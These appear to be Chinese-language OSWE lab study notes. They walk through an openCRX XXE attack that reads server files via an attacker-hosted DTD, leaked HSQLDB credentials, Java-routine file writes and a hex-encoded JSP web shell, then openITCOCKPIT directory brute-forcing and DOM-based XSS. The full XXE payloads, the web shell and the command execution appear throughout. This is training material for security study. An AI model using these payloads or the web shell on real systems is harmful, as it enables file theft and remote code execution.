存在漏洞的 parser 會讀取`/etc/passwd` 檔案的內容，並插入到`lastName` tag 中。若伺服器回應中包含`lastName` 的內容就可以利用此漏洞讀取伺服器上的檔案

在範例環境中 Accounts 頁面很適合作為攻擊目標，因為Accounts API 接受 XML 輸入，且會顯示在 Web 中\
![image](https://hackmd.io/_uploads/S1x0rUvp-l.png)

Wizards > Explore API...\
![image](https://hackmd.io/_uploads/SkckUID6Zg.png)

在 API Explorer 頁面上利用 `Accounts API` 向 /account 送 POST request\
將 Request body 更改至 application/xml 

點擊 "Model" 可以看一些 sample objects\
![image](https://hackmd.io/_uploads/Syup_IDp-x.png)


搜尋 documentation 可以找到 API endpoint 的範例：
```
Method: POST
URL: http://localhost:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account
Body:	
<?xml version="1.0"?>
<org.opencrx.kernel.account1.Contact>
  <lastName>REST</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
```
利用 API endpoint example 測試 
![image](https://hackmd.io/_uploads/Bk_SC8PpZx.png)

Burp 修改 request:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
![image](https://hackmd.io/_uploads/HJCiR8w6Wx.png)
> XML parser 讀取了我們的 entity 👉🏻  Replaced 姓氏

繼續修改 request 注入 payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
![image](https://hackmd.io/_uploads/HkDM1DDT-e.png)

XML parser 可以讀 /etc/passwd 內容且嘗試插入到資料庫的欄位
```
{"@id":"statement","$":"INSERT INTO OOCKE1_ACCOUNT (citizenship_, modified_at, ext_code21_, children_names_, education, access_level_browse, external_link_, ext_code20_, account_category_, created_at, modified_by_, account_type_, access_level_update, religion_, ext_code27_, user_date_time4_, dtype, ext_code29_, first_name, user_date4_, ext_code22_, vcard, family_status, \"P$$PARENT\", user_boolean4_, category_, gender, owner_, business_type_, ext_code28_, account_state, access_level_delete, created_by_, last_name, user_string4_, account_rating, preferred_contact_method, partner_, closing_code, contact_, salutation_code, user_number4_, ext_code26_, ext_code25_, ext_code23_, full_name, user_code4_, preferred_written_language, ext_code24_, preferred_spoken_language, object_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"},
{"@id":"values","$":"[0, Tue Feb 18 08:40:12 PST 2020, 0, 0, 0, 3, 1, 0, 0, Tue Feb 18 08:40:12 PST 2020, 1, 0, 2, 0, 0, 0, org:opencrx:kernel:account1:Contact, 0, Tom, 0, 0, BEGIN:VCARD\nVERSION:3.0\nUID:3743L6W72YVHM8WC6MBNJN12H\nREV:20200218T164012Z\nN:root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\n
...
"@exceptionClass":"java.sql.SQLDataException","@methodName":"sqlException","description":"data exception: string data, right truncation;  table: OOCKE1_ACCOUNT column: FULL_NAME","parameter":{"_item":[{"@id":"sqlErrorCode","$":"3401"},{"@id":"sqlState","$":"22001"}]},
```
SQL error message 表示 contents 超過 column size

### CDATA
若 XXE payloa 包含有分隔符號或特殊字元（例如 `<`,`>`）的文件，可能會遇到 parser errors\
XML 支援 CDATA sections: 包在 `<![CDATA[ ... ]]>` 中的內容，parser 會把它當成純文字，不當作 XML 標記處理\
Ex. `<lastName><![CDATA[<abc>&test;</abc>]]></lastName>`
parser 不會去把 `<abc>` 當成 tag，也不會把 `&test;` 當作 entity

### Updating the XXE Exploit
>[!Tip]
> 為什麼不能直接在 payload 裡簡單拼起來?
> ```xml
> <!ENTITY start "<![CDATA[">
><!ENTITY file SYSTEM "file:///path/to/file">
><!ENTITY end "]]>">
> ```
> 在 XML 裡寫: `<lastName>&start;&file;&end;</lastName>`\
> 很多 parser 對 entity 串接有限制，直接在一般 Entity 之間拼接，常會產生語法錯誤
>> 把真正的拼接邏輯搬到外部 DTD 

建立兩個 entities 分別作為 CDATA 開始與結束 tags 。如果將三個  entities 串在一起，XML parser 會報錯
需要一個額外的 entity 作為 CDATA entities 和 file content entity 的 "wrapper"\
🥚 不能在定義 DTD 中引用另一個 entity 需要使用外部 DTD file 中由 "wrapper" entity 所引用的 parameter entities

在 Kali 本機 `/var/www/html` 建立 DTD file 並啟用 Apache
```
┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ sudo cat /var/www/html/wrapper.dtd 
<!ENTITY wrapper "%start;%file;%end;">

┌──(chw💲CHW)-[~/Offsec/OSWE]
└─$ sudo systemctl start apache2
Listing 44 - Starting the apache2 se
```

並更改 payload 引用 Kali DTD\
(嘗試在 TomEE 存取 tomcat-users.xml)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://{Kali IP}/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```
依據 Payload:
1. XML parse 會下載並解析 wrapper.dtd  
2. DTD 定義的 wrapper 實體會被建立
3. `%start` 會被換成 `"<![CDATA["`
4. `%file` 被換為 `tomcat-users.xml的內容`
5. `%end` 被替換為 `"]]>`
 
解析後的值放入 lastName 欄位中\
![image](https://hackmd.io/_uploads/HJI4fsoaZx.png)
> 成功讀到 tomcat-users.xml

###  Gaining Remote Access to HSQLDB
嘗試攻擊 Tomcat Manager 部署惡意 WAR file
![image](https://hackmd.io/_uploads/rJAPNjspbe.png)
> 403

Interestingly, Java 中的 File 類別可以引用檔案和目錄\
若將 XXE payload 引用目錄會返回目錄列表。利用這一點枚舉伺服器上的目錄和檔案\
![image](https://hackmd.io/_uploads/rkv4uij6Zl.png)

經過搜尋後，在 `/home/student/crx/data/hsqldb/` 目錄下找到了幾個與資料庫相關的文件，其中包括一個包含憑證的文件 `dbmanager.sh`
![image](https://hackmd.io/_uploads/BJNEYssTZl.png)
> - 連線：`jdbc:hsqldb:hsql://127.0.0.1:9001/CRX`
> - User: sa 
> - Password: manager99
> 
> 似乎正在使用 HSQLDB

HSQLDB 伺服器依賴 Access Control Lists (ACLs)  或 [network layer protections](https://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_security) 來限制使用者名稱和密碼以外的存取權限\
透過讀取 `crx.properties` 檔案來確定 HSQLDB 本身是否定義了任何 ACL\
![image](https://hackmd.io/_uploads/SyksciopZe.png)
> properties file 中沒有定義任何 ACL
 
鑑於 JDBC 引用 9001 port 嘗試使用 nmap 掃描 9001
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ nmap -p 9001 opencrx
[2026-04-26 11:18:00] nmap -p 9001 opencrx
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-26 11:18 -0400
Nmap scan report for opencrx (192.168.209.126)
Host is up (1.2s latency).

PORT     STATE  SERVICE
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 1.55 seconds
```
嘗試連線 HSQLDB: 需要一個 HSQLDB client 才能連線\
可以 從 [HSQLDB 網站](https://sourceforge.net/projects/hsqldb/files/hsqldb/)下載 hsqldb.jar 文件，包含資料庫管理工具。
```
┌──(chw💲CHW)-[~/Offsec/OSWE/opencrx]
└─$ java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
```
![image](https://hackmd.io/_uploads/BkJmQ3jpWx.png)

>[!Tip]
> HSQL 沒有類似 MySQL 的 `SELECT INTO OUTFILE`函數。但可以呼叫 Java 程式碼

目前攻擊鏈：
```
XXE 任意檔案讀取
  ↓
讀設定檔 / script
  ↓
取得 HSQLDB JDBC 連線資訊與帳密
  ↓
確認 9001/tcp 對外開放
  ↓
遠端登入 HSQLDB
  ↓
尋找 HSQLDB → Java code execution / file write 路徑
```

### Java Language Routines
使用 [Java Language Routines (JRT)](https://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines) 從 HSQLDB 呼叫 Java class  的靜態方法。 與任何 Java 一樣，該類別需要位於應用程式的 classpath。\
JRT 可以定義為 functions 或 procedures。如果 Java 方法傳回一個變量，則函數可以作為普通 SQL statement 的一部分使用。如果要呼叫的 Java 方法傳回 void，則需要使用 procedure。 procedure 透過 CALL 語句呼叫。

## Remote Code Execution
先建立一個 poc function ，透過呼叫 Java 的 `System.getProperty()`method 檢查系統屬性，Ex. Java 版本和目前工作目錄: 接收一個 String 並傳回一個 value
```java
 CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```
> 建立 systemprop 的新函數（User-Defined Function, UDF），接收 `key`的 varchar 值作為參數，並回傳 varchar 類型的值\
> - `CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR`: 建立一個名為 systemprop 的函數\
> 👉🏻 在 SQL 中可以 `VALUES systemprop('java.version');`, `SELECT systemprop('user.dir');`
> - `DETERMINISTIC`: 讓資料庫知道這個 function 沒有隨機性
> - `NO SQL`: 不會執行 SQL 查詢
> - `EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'`: 把 SQL function `systemprop('java.version')` 對應到 Java `java.lang.System.getProperty("java.version");`

常見可查的 key:
- `VALUES systemprop('java.version');`: Java 版本
- `VALUES systemprop('java.home');`: Java 安裝路徑
- `VALUES systemprop('user.dir');`: 目前工作目錄
- `VALUES systemprop('os.name');`: 系統名稱
- `VALUES systemprop('user.name');`: 執行 JVM 的系統使用者
- `VALUES systemprop('file.separator');`: 檔案路徑分隔符號

回到環境範例，在 openCRX 上建立該函數，在 HSQL Database Manager GUI 的右上角視窗中輸入 codex 並 Execute SQL\
![image](https://hackmd.io/_uploads/HJWa5Lnabx.png)

函數創建後需要呼叫，使用 VALUES clause 來呼叫函數，傳入`java.class.path` 作為參數來檢查 HSQLDB  process 的類別路徑\
![image](https://hackmd.io/_uploads/H1GUsI26Ze.png)
> 可用的類路徑有限。雖然只列出了 `hsqldb.jar`，但 Java process 始終可以存取預設的 Java classes\
> 若想使用函數或程序執行惡意操作，則需要在 `hsqldb.jar` 或 core Java JAR files 中找到合適的 method

>[!Note]
> Restrictions:
> 1. method 必須是 static
> 2. 參數型別要能對應 SQL
> 3. return type 要合法（或 void）
> 4. method 本身要能寫檔 or 能執行 command

🧠 透過 JD-GUI 搜尋符合的 methods\
標準類別儲存在 `lib/rt.jar` 中。用 JD-GUI 開啟 jar 但搜尋功能無法處理 method signatures\
👉🏻 將 source code 從 JD-GUI 匯出，然後用 VS Code 開啟。

使用正規表示式 `public static void \w+\(String)`作為搜尋詞:
- string "public static void"
- 後面跟任意數量的 word characters（a-zA-Z0-9）
- 後面跟著一個括號
- 後面跟著單字 "String"

這個搜尋字串可以找到所有 public, static, return void且第一個參數為字串的 method\
![image](https://hackmd.io/_uploads/SyVbEv3TZe.png)

在 `/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar` 中的 `com.sun.org.apache.xml.internal.security.utils.JavaUtils` 符合條件：
```java
096  public static void writeBytesToFilename(String paramString, byte[] paramArrayOfByte) {
097    FileOutputStream fileOutputStream = null;
098      try {
099        if (paramString != null && paramArrayOfByte != null) {
100          File file = new File(paramString);
101           
102          fileOutputStream = new FileOutputStream(file);
103           
104          fileOutputStream.write(paramArrayOfByte);
105          fileOutputStream.close();
106        }
107        else if (log.isLoggable(Level.FINE)) {
108          log.log(Level.FINE, "writeBytesToFilename got null byte[] pointed");
109        }
110     
111      } catch (IOException iOException) {
112        if (fileOutputStream != null) {
113          try {
114            fileOutputStream.close();
115          } catch (IOException iOException1) {
116            if (log.isLoggable(Level.FINE)) {
117              log.log(Level.FINE, iOException1.getMessage(), iOException1);
118          }
119        } 
120      }
121    } 
122  }
```
重點：
```java
File file = new File(paramString);
fileOutputStream = new FileOutputStream(file);
fileOutputStream.write(paramArrayOfByte);
```
可以指定檔名 + 任意 byte[]

根據 [HSQLDB document](https://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_static_methods) 可以從查詢中傳遞字串和位元組數組類型
SQL Type | Java Type | 
:------:|:---------------------|
CHAR or VARCHAR  |    String    | 
BINARY  |    byte[]    | 
VARBINARY  |    byte[]    | 

建立一個新的 procedure 計劃回傳 void，我們將使用
- `VARCHAR` 作為paramString 參數
- 使用 `VARBINARY` 作為 paramArrayOfByte 參數
- 設定 BINARY 欄位的長度

資料庫會用 `0` 填入提交的任何值，可能會影響我們要建立的文件，所以改使用 VARBINARY，它不會填充值，大小設定為 1024
- BINARY 會 padding 0x00 
- VARBINARY 不會 

```
CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```

建立 procedure 的語法和建立 function 基本相同，在 openCRX 上建立 procedure 後，用 CALL 呼叫\
測試將 "It worked!" 編碼為 ASCII HEX 字串作為 payload
```procedure
call writeBytesToFilename(
  'test.txt',
  cast('497420776f726b656421' AS VARBINARY(1024))
)
```
> `497420776f726b656421`=  "It worked!"

接著驗證讀檔，可在資料庫的工作目錄中找到 test.txt 的新檔案，利用 `systemprop` 函數取得工作目錄\
![image](https://hackmd.io/_uploads/SJigbK2aWl.png)

### Finding the Write Location
已驗證可寫，需要把可寫檔轉成 "可被執行的寫檔"\
🧠：根據環境範例，找到 TomEE 的部署目錄（webapps），把 JSP 寫進去 → 用瀏覽器觸發 → RCE

### Writing Web Shells
已知檔案的寫入位置，就可以使用 `writeBytesToFilename` procedure 來寫 JSP shell\
建立 `cmdjsp.jsp`:
```jsp
// note that linux = cmd and windows = "cmd.exe /c + cmd" 

<FORM METHOD=GET ACTION='cmdjsp.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>

<!--    http://michaeldaw.org   2006    -->
```
Update shell 轉成能在 Linux 執行的 shell，並縮小到 1024 位元組以內\
為節省空間:
- 移除 HTML form element
- JSP webshell 轉換為 ASCII HEX
- 呼叫writeBytesToFilename 函數，並指向 opencrx-core-CRX 目錄的相對路徑 

```java
call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp', cast('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' as VARBINARY(1024)))
```
呼叫 JSP 戴上 query cmd=hostname
```
┌──(chw💲CHW)-[~]
└─$ curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=hostname

<pre>
opencrx
</pre>

```

# openITCOCKPIT XSS and OS Command Injection - Blackbox
[openITCOCKPIT](https://openitcockpit.io/) 是一款輔助設定和管理 [Nagios](https://www.nagios.org/) 和 [Naemon](https://www.naemon.org/) 常用監控工具的應用程式，提供開源版和企業版\
章節漏洞由 Offensive Security 發現，分別為 CVE-2020-10788、CVE-2020-10789 和 CVE-2020-10790

## Black Box Testing in openITCOCKPIT
![image](https://hackmd.io/_uploads/SkPgQc3pbx.png)

## Application Discovery
為發現 exposed endpoints，先訪問 home page，觀察產生的其他 endpoints
> 在 Black Box 中，每個線索都可能有價值

### Building a Sitemap
透過 Burp 的 Target 建立 sitemap\
![image](https://hackmd.io/_uploads/SkaR0c2pWx.png)

1. openITCOCKPIT 使用 HTTPS 協定。瀏覽 80 會 302 到 443
2. 沒有有效的 session，會被 302 到/login/login。
3. application 使用 [Bootstrap](https://getbootstrap.com/)、[jQuery](https://jquery.com/)、 [Particles](https://vincentgarreau.com/particles.js/) 和 [Font Awesome](https://fontawesome.com/) 
4. vendor dependencies 儲存在 lib 和 vendor 目錄
5. 自定義的 JavaScript 檔案位於 js 目錄

可再利用 Gobuster 或 DIRB 等工具找出隱藏路徑
例如：phpmyadmin\
![image](https://hackmd.io/_uploads/S1wbWi2pWg.png)

嘗試載入不存在頁面\
![image](https://hackmd.io/_uploads/SJbD-o3pWl.png)\
雖然顯示 404 頁面，但在 Burp 擴大 Sitemap 載入更多資源\
![image](https://hackmd.io/_uploads/HyiR-inpbx.png)
> `/js/vendor/UUID.js-4.0.3/` 包含 dist 子目錄\
> 🧠：dist/ 存在，可能存在整個 repo 被打包上線
>> 當 JavaScript library 建置成功時，輸出檔通常會寫入 dist（或public）子目錄， dist 目錄存在可能代表開發者包含了整個目錄


JavaScript-heavy applications 常會傾向於使用 [webpack](https://webpack.js.org/) bundler 之類的打包工具和 [Node Package Manager(npm)](https://www.npmjs.com/) 套件管理器，取代手動 distribution。這種 workflow 可以簡化開發且確保只發正確的文件

openITCOCKPIT 直接瀏覽 `/js/vendor/UUID.js-4.0.3/` 目錄顯示 403。透過搜尋 UUID.js 開發者的主頁獲取更多資訊\
在 Google 上搜尋 uuid.js "4.0.3" 找到該 library 的 npm 頁面：(~~或直接問 AI~~)\
![image](https://hackmd.io/_uploads/S1Pyy33p-l.png)

GitHub page:
![image](https://hackmd.io/_uploads/B1duJ2npZl.png)
> uuidjs 的 GitHub repo 包含 dist 目錄

嘗試瀏覽查看是否存在 README\ 
![image](https://hackmd.io/_uploads/By5cWn2TWe.png)

Server-side executable files（Ex.php）很少包含在 vendor libraries, 中，也代表不是往 SQLi 或 RCE 的方向切入\
然而 libraries 可能包含 HTML 可能會引入 reflected XSS 漏洞

### Targeted Discovery
```
把 vendor 靜態資源 → 轉成可離線分析的攻擊面 → 找 DOM-based XSS
```
先在 vendor 目錄中尋找其他 libraries，查看 sitemap 已知存在五個函式庫：`UUID.js-4.0.3`、 `fineuploader`、`gauge`、`gridstack` 和 `lodash`：
![image](https://hackmd.io/_uploads/Bk1Y73hp-l.png)

使用像 Gobuster 暴力破解 vendor 目錄，但不用常用字典。\
使用 npm 排名前一萬的 JavaScript 套件字典檔\
nice-registry repo 包含一個精心整理的 [npm package list](https://raw.githubusercontent.com/nice-registry/all-the-package-names/bba7ca95cf29a6ae66a6617006c8707aa2658028/names.json) ，包含超過 17 萬個 entries\
下載後將 JSON 檔案轉成 Gobuster 可以接受的清單格式 txt
![image](https://hackmd.io/_uploads/ryq42ypabx.png)

```
┌──(chw💲CHW)-[/usr/share/seclists/Discovery]
└─$ gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k
[2026-04-27 16:53:19] gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://openitcockpit/js/vendor/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./npm-10000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
lodash               (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/lodash/]
gauge                (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/gauge/]
bootstrap-daterangepicker (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/bootstrap-daterangepicker/]
Progress: 9999 / 9999 (100.00%)
===============================================================
Finished
===============================================================
```
![image](https://hackmd.io/_uploads/SJrMbeTpbe.png)
> 透過 Gobuster 額外發現 bootstrap-daterangepicker 套件

目前只知道 UUID.js 套件版本，其他 vendor libraries 還未知，因此要對所有 library 目錄暴力破解，嘗試找出版本\
建立一個包含 packages 的 URL 清單
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ cat packages.txt             
[2026-04-27 17:03:47] cat packages.txt
https://openitcockpit/js/vendor/fineuploader
https://openitcockpit/js/vendor/gauge
https://openitcockpit/js/vendor/gridstack
https://openitcockpit/js/vendor/lodash
https://openitcockpit/js/vendor/UUID.js-4.0.3
https://openitcockpit/js/vendor/bootstrap-daterangepicker
```
接著挑選 wordlist，該字典檔必須包含常見的檔案名 Ex. README.md，其中可能包含版本號碼\
使用 [seclists](https://github.com/danielmiessler/SecLists) 中的 `/usr/share/seclists/Discovery/Web-Content/quickhits.txt` 清單
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ while read l; do echo "===$l==="; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < packages.txt
[2026-04-27 17:06:06] while read l; do echo "===$l==="; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < packages.txt
===https://openitcockpit/js/vendor/fineuploader===
===https://openitcockpit/js/vendor/gauge===
===https://openitcockpit/js/vendor/gridstack===
bower.json           (Status: 200) [Size: 664]
demo                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/gridstack/demo/]
dist/                (Status: 403) [Size: 162]
README.md            (Status: 200) [Size: 22599]
===https://openitcockpit/js/vendor/lodash===
.editorconfig        (Status: 200) [Size: 321]
.gitattributes       (Status: 200) [Size: 12]
.gitignore           (Status: 200) [Size: 67]
.ssh/id_rsa_key.pub  (Status: 502) [Size: 166]
.ssh/id_dsa_key.pub  (Status: 502) [Size: 166]
.ssh/identity_key.pub (Status: 502) [Size: 166]
.ssh/id_ecdsa_key.pub (Status: 502) [Size: 166]
.ssh/id_ed25519_key.pub (Status: 502) [Size: 166]
.ssh/id_ecdsa_sk_key.pub (Status: 502) [Size: 166]
.ssh/id_ed25519_sk_key.pub (Status: 502) [Size: 166]
.ssh/id_rsa_key.pub~ (Status: 502) [Size: 166]
.travis.yml          (Status: 200) [Size: 4874]
bower.json           (Status: 200) [Size: 284]
CONTRIBUTING.md      (Status: 200) [Size: 2402]
package.json         (Status: 200) [Size: 586]
README.md            (Status: 200) [Size: 1458]
test                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/lodash/test/]
test/                (Status: 403) [Size: 162]
===https://openitcockpit/js/vendor/UUID.js-4.0.3===
.gitignore           (Status: 200) [Size: 34]
bower.json           (Status: 200) [Size: 498]
dist/                (Status: 403) [Size: 162]
LICENSE.txt          (Status: 200) [Size: 11357]
package.json         (Status: 200) [Size: 1010]
README.md            (Status: 200) [Size: 5039]
test                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/UUID.js-4.0.3/test/]
test/                (Status: 403) [Size: 162]
===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
README.md            (Status: 200) [Size: 2796]
```
![image](https://hackmd.io/_uploads/HkQWNxa6Wg.png)
> - `-q` 參數防止 Gobuster 列印 headers

Gobuster 沒有發現 fineuploader 或 gauge 任何目錄\
在 `gridstack`、`lodash`、 `UUID.js-4.0.3`、 `bootstrap-daterangepicker` 找到 README.md

為進一步瀏覽 README，將 packages.txt 中的 fineuploader 和 gauge 移除，也移除 UUID.js-4.0.3 (已知版本號 4.0.3)\
![image](https://hackmd.io/_uploads/rJ3KVe6TZx.png)

```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit]
└─$ while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt
[2026-04-27 17:11:21] while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt
===https://openitcockpit/js/vendor/gridstack===
gridstack.js
============
...
- [Changes](#changes)
      - [v0.2.3 (development version)](#v023-development-version)
...
===https://openitcockpit/js/vendor/lodash===
# lodash v3.9.3
...

===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
...
```
> - `gridstack`: v0.2.3
> - `lodash`: v3.9.3
> - `bootstrap-daterangepicker`: 未知

接著鎖定 GitHub 開源的 three package:
- UUID.js: https://github.com/LiosK/UUID.js/archive/v4.0.3.zip
- Lodash: https://github.com/lodash/lodash/archive/3.9.3.zip
- Gridstack: https://github.com/gridstack/gridstack.js/archive/v0.2.3.zip

解壓縮每個壓縮檔案後，就能取得應用程式對應目錄中所有檔案的副本\
這些文件最有可能包含 XSS 漏洞或加載包含 XSS 漏洞的 JavaScript

使用 find 搜尋 -iname 不分大小寫
```
┌──(chw💲CHW)-[~/Offsec/OSWE/openitcockpit/package]
└─$ find ./ -iname "*.html"
[2026-04-27 17:25:20] find ./ -iname "*.html"
./lodash-3.9.3/vendor/firebug-lite/skin/xp/firebug.html
./lodash-3.9.3/perf/index.html
./lodash-3.9.3/test/index.html
./lodash-3.9.3/test/underscore.html
./lodash-3.9.3/test/backbone.html
./gridstack.js-0.2.3/demo/nested.html
./gridstack.js-0.2.3/demo/serialization.html
./gridstack.js-0.2.3/demo/float.html
./gridstack.js-0.2.3/demo/knockout2.html
./gridstack.js-0.2.3/demo/two.html
./gridstack.js-0.2.3/demo/knockout.html
./UUID.js-4.0.3/docs/index.html
./UUID.js-4.0.3/docs/uuid.js.html
./UUID.js-4.0.3/docs/UUID.html
./UUID.js-4.0.3/test/browser.html
./UUID.js-4.0.3/test/browser-core.html
```
由於這些 HTML files 並非由 server 動態生成，傳統的 reflected XSS 和 stored XSS 都無法利用
可能導致基於 DOM 的 XSS 攻擊

## Intro To DOM-based XSS
Document Object Model (DOM)，當瀏覽器解析 HTML 頁面時，必須渲染各個 HTML elements，渲染過程會為每個元素建立 object 以供顯示\
Ex.  div 的 HTML elements 可包含其他 HTML element，例如 h1：\
當瀏覽器解析時，會建立一個 div object，其中 h1 object 作為 child node。由各個 HTML 元素的物件所構成的 [hierarchical tree](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model) = Document Object Model，HTML 元素可以透過 id, class, tag name 以及其他在 DOM 中的 identifiers 識別。
```html
<div>
  <h1>Hello</h1>
</div>
```
在 Broswer 中：
```
div
 └── h1
```
瀏覽器會根據 HTML 產生 DOM，從而允許透過 JavaScript 對頁面進行 programmatic manipulation 操作。開發者可以使用 JavaScript 在客戶端瀏覽器中操作 DOM，以執行 background tasks 、變更 UI 等

JavaScript 實作 [Document](https://developer.mozilla.org/en-US/docs/Web/API/Element/tagName) interface\
在 DOM query object， document interface implements API: `getElementById`、 `getElementsByClassName`、`getElementsByTagName` 等 API \
Element class 包含像 innerHTML 的 properties，允許透過 write() method 寫入 DOM

DOM-based XSS with write()
```html
<!DOCTYPE html>
<html>
<head>
  <script>
    const queryString = location.search;
    const urlParams = new URLSearchParams(queryString);
    const name = urlParams.get('name')
    document.write('<h1>Hello, ' + name + '!</h1>');
  </script>
</head>
</html>
```
script 標籤之間的 JavaScript code 首先從 URL 中提取 query string，使用 [URLSearchParams](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams) interface。接著 constructor parse  query string 然後回傳 URLSearchParams object 保存在 urlParams variable\
接下來用 get method 從 URL parameters 中擷取 name 參數。最後寫入 h1 元素
![image](https://hackmd.io/_uploads/ryNntrRTWe.png)

注入 XSS payload
![image](https://hackmd.io/_uploads/S1nqqSRTZx.png)

會產生 reflected DOM-based XSS 的漏洞，如果附加到 DOM 的值來自 user-controlled 的資料庫，則也可能存在 DOM XSS 漏洞

## XSS Hunting
